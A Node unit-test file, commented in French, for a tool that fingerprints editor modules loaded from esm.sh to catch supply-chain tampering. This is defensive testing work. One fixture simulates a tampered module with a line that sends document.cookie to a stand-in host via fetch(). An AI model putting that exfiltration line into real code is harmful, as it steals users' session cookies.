#!/usr/bin/env node
// Tests purs (Node, sans navigateur ni réseau) de l'outil qui relève et vérifie les empreintes du code de l'éditeur chargé depuis esm.sh : outils/empreintes-editeur.mjs (point sécurité du 06/11,
// risque « chaîne d'approvisionnement » : le code de TipTap et de ProseMirror s'exécute avec l'accès complet au document sans qu'aucune empreinte ne le contrôle). Un faux esm.sh en mémoire sert un petit
// graphe de modules ; ce que l'outil doit attraper :
//  1) une adresse à VERSION FLOTTANTE (`@^2.0.0`, `@~1.2`, `@latest`) : esm.sh la résout à chaque demande, donc une version publiée (ou volée) sur npm se chargerait le jour même. Une adresse à version exacte
//     (dont celles de paquets à portée `@tiptap/core@3.31.3`, d'un build externe `*prosemirror-model@1.25.11` et d'une préversion) n'en est pas une ;
//  2) le parcours lit les imports comme le navigateur : minifiés (`import"/x.mjs"`, `export*from"/y.mjs"`, `import("/z.mjs")`), chemins absolus, relatifs et spécificateurs nus, et la carte d'importation
//     qui REMPLACE une adresse (c'est ainsi qu'une adresse flottante est figée : une entrée de la carte qui la renvoie vers la version exacte) ;
//  3) la vérification : rien n'a bougé = rien à dire ; un fichier figé chez esm.sh qui change d'un octet, un fichier nouveau, un fichier disparu, une adresse flottante qui revient, ou des navigateurs qui
//     reçoivent des octets différents (un serveur qui change de réponse selon le navigateur) = écart ; un fichier non figé (une cale `node/*.mjs`, un jour de cache) qui change = « à regarder » seulement.
// Lancer : node dev-tests/unit-editor-fingerprints.mjs
import { check, summarizeAndExit } from './unit-harness.mjs';
import { floatingVersion, resolveSpecifier, specifiersOf, esmImports, importMapDigest, crawl, consolidate, buildManifest, compare } from '../outils/empreintes-editeur.mjs';

// ---- 1. Versions flottantes et versions exactes
const exact = [
  'https://esm.sh/@tiptap/core@3.31.3', 'https://esm.sh/@tiptap/core@3.31.3/es2022/core.mjs', 'https://esm.sh/*prosemirror-model@1.25.11', 'https://esm.sh/*prosemirror-model@1.25.11/es2022/prosemirror-model.mjs',
  'https://esm.sh/@floating-ui/utils@0.2.12/dom?target=es2022', 'https://esm.sh/linkifyjs@4.4.0?target=es2022', 'https://esm.sh/pkg@1.0.0-beta.2/es2022/pkg.mjs', 'https://esm.sh/node/process.mjs',
];
const floating = [
  ['https://esm.sh/@floating-ui/dom@^1.0.0?target=es2022', '@%5E1.0.0'], ['https://esm.sh/linkifyjs@^4.3.3?target=es2022', '@%5E4.3.3'], ['https://esm.sh/@floating-ui/utils@^0.2.8/dom?target=es2022', '@%5E0.2.8'],
  ['https://esm.sh/pkg@~1.2.0', '@~1.2.0'], ['https://esm.sh/pkg@latest', '@latest'], ['https://esm.sh/pkg@1', '@1'], ['https://esm.sh/pkg@1.x/es2022/pkg.mjs', '@1.x'], ['https://esm.sh/@scope/pkg@*', '@*'],
];
check('versions : une version exacte n\'est jamais prise pour flottante (paquet à portée, build externe « * », préversion, cale sans version)', exact.every(address => floatingVersion(address) === null), exact.filter(address => floatingVersion(address) !== null).join(' '));
check('versions : `@^1.0.0`, `@~1.2.0`, `@1`, `@1.x`, `@latest` et `@*` sont tous vus comme flottants, même derrière un paquet à portée ou avant un sous-chemin', floating.every(([address]) => floatingVersion(address) !== null), floating.filter(([address]) => floatingVersion(address) === null).map(([address]) => address).join(' '));

// ---- 2. La lecture des imports et la résolution des adresses
const minified = 'import"/a.mjs";import{x as y}from"/b.mjs";export*from"/c.mjs";export{z}from"./d.mjs";const l=()=>import("/e.mjs");import w,{v}from "pkg-nu";export*as ns from"/f.mjs";/* from"/pas-un-import.mjs" ignoré s\'il n\'est pas précédé d\'import ou d\'export */';
const specs = specifiersOf(minified);
check('lecture : les imports minifiés (import"…", from"…", export*from"…", export{…}from"…", import(…), export*as) sont tous trouvés, rien de plus', JSON.stringify(specs) === JSON.stringify(['/a.mjs', '/b.mjs', '/c.mjs', './d.mjs', '/e.mjs', 'pkg-nu', '/f.mjs']), JSON.stringify(specs));
const imports = { 'pkg-nu': 'https://esm.sh/pkg-nu@1.0.0', 'https://esm.sh/dep@^2.0.0?target=es2022': 'https://esm.sh/dep@2.3.0?target=es2022' };
const from = 'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs';
check('résolution : chemin absolu, relatif, spécificateur nu (carte) et adresse complète donnent l\'adresse absolue', resolveSpecifier('/x/y.mjs', from, imports) === 'https://esm.sh/x/y.mjs' && resolveSpecifier('./z.mjs', from, imports) === 'https://esm.sh/pkg@1.0.0/es2022/z.mjs' && resolveSpecifier('pkg-nu', from, imports) === 'https://esm.sh/pkg-nu@1.0.0' && resolveSpecifier('https://esm.sh/q.mjs', from, imports) === 'https://esm.sh/q.mjs');
check('résolution : la carte d\'importation REMPLACE une adresse flottante par la version exacte (c\'est ce qui la fige), comme le fait le navigateur', resolveSpecifier('/dep@^2.0.0?target=es2022', from, imports) === 'https://esm.sh/dep@2.3.0?target=es2022');
check('résolution : un spécificateur nu que la carte ne connaît pas n\'est pas résolu (le navigateur refuserait de le charger)', resolveSpecifier('inconnu', from, imports) === null);

// ---- 3. Un faux esm.sh : un paquet qui importe une dépendance à version flottante et une cale non figée
const stub = path => `/* esm.sh */\nexport * from "${path}";\n`;
function server(over = {}) {
  const files = {
    'https://esm.sh/pkg@1.0.0': stub('/pkg@1.0.0/es2022/pkg.mjs'),
    'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs': 'import{a}from"/dep@^2.0.0?target=es2022";import"/node/shim.mjs";export const b=a;',
    'https://esm.sh/dep@^2.0.0?target=es2022': stub('/dep@2.3.0/es2022/dep.mjs'),
    'https://esm.sh/dep@2.3.0?target=es2022': stub('/dep@2.3.0/es2022/dep.mjs'),
    'https://esm.sh/dep@2.3.0/es2022/dep.mjs': 'export const a=1;',
    'https://esm.sh/node/shim.mjs': 'export default {};',
    ...over,
  };
  const calls = [];
  const fetchFn = async (address, userAgent) => {
    calls.push([address, userAgent]);
    const text = typeof files[address] === 'function' ? files[address](userAgent) : files[address];
    if (text === undefined) return { status: 404, bytes: Buffer.from('introuvable'), cacheControl: 'public, max-age=600' };
    // esm.sh : un cache immuable d'un an pour les fichiers à version exacte, dix minutes pour une adresse flottante, un jour pour ses cales.
    const cacheControl = /\/node\//.test(address) ? 'public, max-age=86400' : floatingVersion(address) ? 'public, max-age=600' : 'public, max-age=31536000, immutable';
    return { status: 200, bytes: Buffer.from(text), cacheControl };
  };
  return { fetchFn, calls };
}
const BROWSERS = { chrome: 'UA-chrome', firefox: 'UA-firefox', safari: 'UA-safari' };
const pinned = { pkg: 'https://esm.sh/pkg@1.0.0', 'https://esm.sh/dep@^2.0.0?target=es2022': 'https://esm.sh/dep@2.3.0?target=es2022' };
const unpinned = { pkg: 'https://esm.sh/pkg@1.0.0' };
async function walk(map, over) {
  const s = server(over);
  const result = await crawl({ imports: map, fetchFn: s.fetchFn, browsers: BROWSERS });
  const consolidated = consolidate(result);
  return { ...s, result, consolidated, addresses: Object.keys(consolidated.files).sort() };
}

const withMap = await walk(pinned);
check('parcours : de proche en proche, tout ce que la carte fait charger, cales comprises, et la dépendance flottante n\'y est PLUS (la carte l\'a remplacée par sa version exacte)',
  JSON.stringify(withMap.addresses) === JSON.stringify(['https://esm.sh/dep@2.3.0/es2022/dep.mjs', 'https://esm.sh/dep@2.3.0?target=es2022', 'https://esm.sh/node/shim.mjs', 'https://esm.sh/pkg@1.0.0', 'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs']), JSON.stringify(withMap.addresses));
check('parcours : chacun des cinq fichiers est demandé avec chacun des trois navigateurs, et le parcours n\'a laissé aucun spécificateur de côté', withMap.calls.length === 5 * 3 && withMap.result.problems.length === 0, `${withMap.calls.length} demandes, ${withMap.result.problems.length} problème(s)`);
check('parcours : les fichiers à version exacte sont notés « figés » (cache immuable), la cale de node/ ne l\'est pas', withMap.consolidated.files['https://esm.sh/pkg@1.0.0/es2022/pkg.mjs'].frozen === true && withMap.consolidated.files['https://esm.sh/node/shim.mjs'].frozen === false);
const without = await walk(unpinned);
check('parcours SANS l\'entrée de la carte : la dépendance flottante est dans le parcours (c\'est ce que la vérification refuse)', without.addresses.some(floatingVersion), without.addresses.join(' '));

// ---- 4. Le relevé et sa vérification
const manifest = buildManifest({ imports: pinned, consolidated: withMap.consolidated, browsers: Object.keys(BROWSERS) });
const same = compare(manifest, (await walk(pinned)).consolidated);
check('vérification : rien n\'a bougé, rien à dire', same.hard.length === 0 && same.soft.length === 0, JSON.stringify(same));
const changedFrozen = compare(manifest, (await walk(pinned, { 'https://esm.sh/dep@2.3.0/es2022/dep.mjs': 'export const a=1;fetch("https://autre.exemple/?"+document.cookie);' })).consolidated);
check('vérification : un fichier figé chez esm.sh qui change d\'un octet est un écart, nommé', changedFrozen.hard.length === 1 && /fichier figé modifié : https:\/\/esm\.sh\/dep@2\.3\.0\/es2022\/dep\.mjs/.test(changedFrozen.hard[0]), JSON.stringify(changedFrozen));
const changedShim = compare(manifest, (await walk(pinned, { 'https://esm.sh/node/shim.mjs': 'export default {version:2};' })).consolidated);
check('vérification : une cale non figée qui change est « à regarder » seulement, pas un écart', changedShim.hard.length === 0 && changedShim.soft.length === 1 && /non figé/.test(changedShim.soft[0]), JSON.stringify(changedShim));
const newImport = compare(manifest, (await walk(pinned, { 'https://esm.sh/dep@2.3.0/es2022/dep.mjs': 'import"/charge-utile@1.0.0/es2022/c.mjs";export const a=1;', 'https://esm.sh/charge-utile@1.0.0/es2022/c.mjs': 'export {};' })).consolidated);
check('vérification : un fichier nouveau (un import ajouté chez esm.sh) est un écart', newImport.hard.some(line => /nouveau fichier chargé, absent du relevé : https:\/\/esm\.sh\/charge-utile@1\.0\.0\/es2022\/c\.mjs/.test(line)), JSON.stringify(newImport));
const vanished = compare(manifest, (await walk(pinned, { 'https://esm.sh/pkg@1.0.0/es2022/pkg.mjs': 'export const b=1;' })).consolidated);
check('vérification : un fichier du relevé qui n\'est plus chargé est un écart', vanished.hard.some(line => /n'est plus chargé : https:\/\/esm\.sh\/node\/shim\.mjs/.test(line)), JSON.stringify(vanished));
const floatingBack = compare(manifest, without.consolidated);
check('vérification : une adresse à version flottante dans le parcours est un écart, même si elle servait déjà au relevé', floatingBack.hard.some(line => /version flottante @%5E2\.0\.0/.test(line) || /version flottante @\^2\.0\.0/.test(line)), JSON.stringify(floatingBack));
const cloaked = await walk(pinned, { 'https://esm.sh/dep@2.3.0/es2022/dep.mjs': userAgent => (userAgent === 'UA-firefox' ? 'export const a=1;/* servi à Firefox seulement */' : 'export const a=1;') });
const cloakedCompare = compare(manifest, cloaked.consolidated, cloaked.consolidated.divergences);
check('vérification : un serveur qui sert des octets différents selon le navigateur est un écart (signe d\'une compromission), même si le premier navigateur reçoit le bon fichier', cloaked.consolidated.divergences.length === 1 && cloakedCompare.hard.some(line => /les navigateurs divergent/.test(line)), JSON.stringify(cloakedCompare));

// ---- 5. La carte d'importation de la page
const html = `<script type="importmap">{"imports":{"kit/x":"./kit/js/x.js?v=1","@a/b":"https://esm.sh/@a/b@1.0.0","https://esm.sh/c@^1.0.0?target=es2022":"https://esm.sh/c@1.2.3?target=es2022"}}</script>`;
const mine = esmImports(html);
check('carte : seules les entrées qui touchent esm.sh sont retenues (le kit de GFS change avec son propre sous-module), triées', JSON.stringify(Object.keys(mine)) === JSON.stringify(['@a/b', 'https://esm.sh/c@^1.0.0?target=es2022']), JSON.stringify(Object.keys(mine)));
check('carte : son empreinte change dès qu\'une entrée change (le relevé est alors à refaire), pas quand le kit change', importMapDigest(mine) === importMapDigest(esmImports(html.replace('x.js?v=1', 'x.js?v=2'))) && importMapDigest(mine) !== importMapDigest(esmImports(html.replace('c@1.2.3', 'c@1.2.4'))));

summarizeAndExit();
